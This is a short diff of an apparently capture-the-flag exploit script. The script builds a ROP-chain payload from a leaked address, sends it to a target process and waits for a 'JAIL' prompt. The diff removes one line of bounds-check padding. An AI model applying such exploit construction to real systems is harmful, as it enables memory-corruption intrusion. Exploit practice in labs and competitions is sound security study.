@@ -57,7 +57,6 @@ def exploit(p, mode, libc):
 
     payload = p64(0)*4  # Padding
     payload += get_ropchain(jail_leak)  # Ropchain
-    payload += p64(jail_leak)*4  # Padding for bounds check
     p.sendline(payload)
 
     p.recvuntil('JAIL\n')
